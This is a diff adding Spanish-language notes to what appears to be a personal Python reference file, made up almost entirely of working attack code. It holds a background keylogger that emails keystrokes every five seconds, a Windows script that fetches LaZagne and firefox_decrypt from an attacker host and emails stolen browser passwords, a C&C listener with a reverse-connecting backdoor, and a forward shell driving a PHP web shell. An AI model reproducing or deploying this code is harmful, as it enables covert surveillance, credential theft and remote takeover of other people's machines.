@@ -579,3 +579,430 @@ queue.run()
 ## Generar Expresiones regulares en python (regex generator)
 
 > Go to [pythex.org](http://pythex.org/)
+
+## Keylogger
+
+Ejecutar con el siguiente comando para que funcione en segundo plano:
+
+```shell
+python3 main.py &> /dev/null & disown
+```
+
+```python
+# main.py
+
+#!/usr/bin/env python3
+
+from keylogger import Keylogger
+import signal
+import sys
+from termcolor import colored
+
+def def_handler(sig, frame):
+    print(colored(f"\n[!] Saliendo...\n", 'red'))
+    my_keylogger.shutdown()
+    import sys
+
+signal.signal(signal.SIGINT, def_handler)
+
+if __name__ == '__main__':
+    my_keylogger = Keylogger()
+    my_keylogger.start()
+```
+
+```python
+# keylogger.py
+
+#!/usr/bin/env python3
+
+import pynput.keyboard
+import threading
+import smtplib # para enviar cosas por correo
+from email.mime.text import MIMEText
+
+class Keylogger:
+    def __init__(self):
+        self.log = ""
+        self.request_shutdown = False
+        self.timer = None
+        self.is_first_run = True
+
+    def pressed_key(self, key):
+        try:
+            self.log += str(key.char)
+        except AttributeError:
+            special_keys = {key.space: " ", key.backspace: " Backspace", key.enter: " Enter", key.shift: " Shift", key.ctrl: " Ctrl", key.alt:" Alt"}
+            self.log += special_keys.get(key, f" {str(key)}") # mejor que tener tropecientos if elif, las que no están contempladas en el diccionario toman el valor str(key)}
+
+        print(self.log)
+
+    def send_email(self, subject, body, sender, recipients, password): # https://mailtrap.io/blog/python-send-email-gmail/
+        msg = MIMEText(body)
+        msg['Subject'] = subject
+        msg['From'] = sender
+        msg['To'] = ', '.join(recipients)
+
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
+            smtp_server.login(sender, password)
+            smtp_server.sendmail(sender, recipients, msg.as_string())
+        print("Message sent!")
+
+    def report(self):
+        email_body = "[+] El Keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
+        self.send_email("Keylogger Report", email_body, "sender@gmail.com", ["receiver1@gmail.com", "receiver2@gmail.com"], "app_token")
+        # para crear un app token:
+        # Activar 2FA -> ve a Ajustes >> Seguridad >> Verificación en dos pasos
+        # Ajustes >> Seguridad >> Contraseñas de aplicaciones
+        self.log = ""
+
+        if self.is_first_run:
+            self.is_first_run = False
+
+        if not self.request_shutdown:
+            self.timer = threading.Timer(5, self.report) # con esta función, cada 5 segundos llamas a la función report(), lo que es una llamada recursiva
+            self.timer.start()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key) # primero creamos un listener
+
+        with keyboard_listener: # en caso de que pete, se cierra el listener automáticamente
+            self.report()
+            keyboard_listener.join() # arranca el listener
+
+    def shutdown(self):
+        self.request_shutdown = True
+
+        if self.timer:
+            self.timer.cancel # cancelo el hilo para salir del programa al momento
+```
+
+## Creación de Malware (para Windows)
+
+```python
+#!/usr/bin/env python3
+# coding: cp850
+
+import subprocess
+import requests
+import smtplib # para enviar cosas por correo
+from email.mime.text import MIMEText
+import tempfile # para crear directorios temporales
+import os
+import sys
+
+def send_email(subject, body, sender, recipients, password): # https://mailtrap.io/blog/python-send-email-gmail/
+        msg = MIMEText(body)
+        msg['Subject'] = subject
+        msg['From'] = sender
+        msg['To'] = ', '.join(recipients)
+
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
+            smtp_server.login(sender, password)
+            smtp_server.sendmail(sender, recipients, msg.as_string())
+        print("Message sent!")
+
+def run_command(command):
+    try:
+        output_command = subprocess.check_output(command, shell=True).decode("cp850")
+        return output_command.strip() if output_command else None
+    except:
+        print(f"\n[!] Error al ejecutar el comando {command}.")
+        return None
+
+def download_and_execute_lazagne(): # El Defender no permite ejecutarlo
+    # first download lazagne on your machine: https://github.com/AlessandroZ/LaZagne
+    r = requests.get("http://YOUR_IP:PORT/lazagne.exe")
+    temp_file = tempfile.mkdtemp()
+    os.chdir(tempfile)
+
+    with open("lazagne.exe", "wb") as f:
+         f.write(r.content)
+
+    lazagne_output = run_command("lazagne.exe browsers")
+
+    os.remove("lazagne.exe")
+    return lazagne_output
+
+def get_firefox_profiles(username):
+    path = f"C:\\Users\\{username}\\AppData\\Roami\\Mozilla\\Firefox\\Profiles"
+    try:
+        profiles = [profile for profile in os.listdir(path) if "release in profile"]
+        return profiles[0] if profiles else None
+    except Exception as e:
+         print(f"\n[!] No ha sido posible obtener los profiles de Firefox\n")
+
+def get_firefox_passwords(username, profile):
+    # Nos descargamos el script de la máquina atacante
+    r = requests.get("http://YOUR_IP:YOUR_PORT/firefox_decrypt.py")
+    temp_dir = tempfile.mkdtemp()
+    os.chdir(temp_dir)
+
+    with open("firefox_decrypt.py", "wb") as f:
+        f.write(r.content)
+
+    command = f"python firefox_decrypt.py C:\\Users\\{username}\\AppData\\Roami\\Mozilla\\Firefox\\Profiles\\{profile}"
+    passwords = run_command(command)
+    os.remove("firefox_decrypt.py")
+
+    return passwords
+
+if __name__ == '__main__':
+    # ipconfig_output = run_command("ipconfig")
+    # users_info = run_command("net user")
+    #
+    # send_email("Ipconfig info", ipconfig_output, "sender@gmail.com", ["receiver1@gmail.com", "receiver2@gmail.com"], "app_token")
+    # send_email("Users info", users_info, "sender@gmail.com", ["receiver1@gmail.com", "receiver2@gmail.com"], "app_token")
+
+    # output_lazagne = download_and_execute_lazagne()
+    # print(output_lazagne)
+    # send_email("Lazagne output", output_lazagne, "sender@gmail.com", ["receiver1@gmail.com", "receiver2@gmail.com"], "app_token")
+
+    username = run_command("whoami").split("\\")[1]
+    profile = get_firefox_profiles(username)
+
+    if not username or not profile:
+        sys.exit(f"\n[!] Ha habido un error con el usuario o los perfiles\n")
+    
+    passwords = get_firefox_passwords(username, profile)
+
+    if passwords:
+        send_email("Decrypted Firefox Passwords", passwords, "sender@gmail.com", ["receiver1@gmail.com", "receiver2@gmail.com"], "app_token")
+    else:
+        print("No se han encontrado contraseñas")
+```
+
+## Erear un ejecutable(Windows) de python
+
+```shell
+pyinstaller --onefile FILE.py
+```
+
+## Creación de un Command and Control (C&C)
+
+```python
+# listener.py
+
+#!/usr/bin/env python3
+import socket
+import signal
+import sys
+from termcolor import colored
+import smtplib # para enviar cosas por correo
+from email.mime.text import MIMEText
+
+def def_handler(sig, frame):
+    print(colored(f"\n[!] Saliendo...\n", 'red'))
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+class Listener:
+
+    def __init__(self, ip, port):
+        self.options = {"get users": "List syustem valid users (Gmail)", "help": "Show this help panel"}
+
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # para poder reutilizar la misma conexión
+        server_socket.bind(ip, port)
+        server_socket.listen()
+
+        print(f"\n[+] Listening for incoming connections...")
+
+        self.client_socket, self.client_address = server_socket.accept()
+
+        print(f"\n[+] Connection established by {self.client_address}")
+
+    def execute_remotely(self, command):
+        self.client_socket.send(command.encode())
+        return self.client_socket.recv(2048).decode()
+
+    def get_users(self):
+        self.client_socket.send(b"net user")
+        output_command = self.client_socket.recv(2048).decode()
+
+    def send_email(self, subject, body, sender, recipients, password): # https://mailtrap.io/blog/python-send-email-gmail/
+        msg = MIMEText(body)
+        msg['Subject'] = subject
+        msg['From'] = sender
+        msg['To'] = ', '.join(recipients)
+
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
+            smtp_server.login(sender, password)
+            smtp_server.sendmail(sender, recipients, msg.as_string())
+        print("Message sent!")
+
+    def show_help(self):
+        for key, value in self.options.items():
+            print(f"{key} - {value}\n")
+
+    def run(self):
+        while True:
+            command = input("$> ")
+
+            if command == "get users":
+                self.get_users()
+            elif command == "help":
+                self.show_help()
+            else:
+                command_output = self.execute_remotely(command)
+                print(command_output)
+
+if __name__ == '__main__':
+    my_listener = Listener("192.168.1.40", 666)
+    my_listener.run()
+```
+
+```python
+# backdoor.py
+
+#!/usr/bin/env python3
+import socket
+import subprocess
+
+# FIRST: start the listener
+
+def run_command(command):
+    command_output = subprocess.check_output(command, shell=True).decode("cp850")
+    return command_output
+
+if __name__ == '__main__':
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect(("192.168.1.40", 666))
+
+    while True:
+        command = client_socket.recv(1024).decode().strip() # para respuestas más largas ampliar el control de bytes
+        command_output = run_command(command)
+        client_socket.send(b"\n" + command_output.encode() + b"\n")
+
+    client_socket.close()
+```
+
+## Creación de una Forward Shell
+
+Vienen bien cuando no se puede insertar una reverse shell debido a restricciones de firewall:
+
+```python
+# main.py
+
+#!/usr/bin/env python3
+
+from forward_shell import ForwardShell
+import signal
+import sys
+from termcolor import colored
+
+def def_handler(sig, frame):
+    print(colored(f"\n[!] Saliendo...\n", 'red'))
+    my_forward_shell.remove_data()
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+if __name__ == '__main__':
+    my_forward_shell = ForwardShell()
+    my_forward_shell.run()
+```
+
+```python
+# fordwar_shell.py
+
+#!/usr/bin/env python3
+
+import requests
+from termcolor import colored
+from base64 import b64encode # por los caracteres especiales
+from random import randrange
+import time
+
+class ForwardShell:
+    def __init__(self):
+        session = randrange(1000, 9999)
+        self.main_url = "http://localhost/index.php"
+        self.stdin = f"/dev/shm/{session}.input" # directorio temporal que se frecuenta menos
+        self.stdout = f"/dev/shm/{session}.output"
+        self.help_options = {'enum suid': 'FileSystem SUID Privileges Enumeration', 'help': 'Show this help panel'}
+        self.is_pseudo_terminal = False
+
+    def run_command(self, command):
+        command = b64encode(command.encode()).decode()
+
+        data = { # lo que se envía
+            'cmd': 'echo %s | base64 -d | /bin/sh' % command
+        }
+
+        try:
+            r = requests.get(self.main_url, params=data, timeout=5)
+            return r.text
+        except:
+            pass
+
+        return None
+
+    def write_stdin(self, command: str) -> str:
+        command = b64encode(command.encode()).decode()
+
+        data = {
+            'cmd': 'echo %s | base64 -d > %s' % (command, self.stdin)
+        }
+
+        r = requests.get(self.main_url, params=data)
+
+    def read_stdout(self):
+        for _ in range(5): # para que el archivo output tenga todo el contenido
+            read_stdout_command = f"/bin/cat {self.stdout}"
+            output_command = self.run_command(read_stdout_command)
+            time.sleep(0.1)
+            return output_command
+
+    def setup_shell(self):
+        command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin, self.stdin, self.stdout)
+        self.run_command(command)
+
+    def remove_data(self):
+        remove_data_command = f"/bin/rm {self.stdin} {self.stdout}"
+        self.run_command(remove_data_command)
+
+    def clear_stdout(self):
+        clear_stdout_command = f"echo '' > {self.stdout}"
+        self.run_command(clear_stdout_command)
+
+    def run(self):
+        self.setup_shell()
+        while True:
+            command = input(colored("$> ", 'red'))
+
+            if "script /dev/null -c bash" in command:
+                print(colored(f"\n[+] Se ha iniciado una pseudoterminal\n", 'green'))
+                self.is_pseudo_terminal = True
+
+            if command.strip() == "enum suid":
+                command = f"find / -perm -4000 2>/dev/null | xargs ls -l"
+
+            if command.strip() == "help":
+                print(colored(f"\n[+] Listando panel de ayuda\n", 'yellow'))
+
+                for key, value in self.help_options.items():
+                    print(f"\t{key} - {value}\n")
+
+                continue
+
+            self.write_stdin(command + "\n") # para que simule haber presionado el Enter
+            output_command = self.read_stdout()
+
+            if command.strip() == "exit":
+                self.is_pseudo_terminal = False
+                self.clear_stdout()
+                continue
+
+            if self.is_pseudo_terminal:
+                lines = output_command.split('\n')
+                if len(lines) == 3:
+                    cleared_output = '\n'.join([lines[-1]] + lines[:1])
+                elif len(lines) > 3:
+                    cleared_output = '\n'.join([lines[-1]] + lines[:1] + lines[2:-1])
+                print("\n" + cleared_output + "\n")
+            else:
+                print(output_command)
+            self.clear_stdout()
+```
+
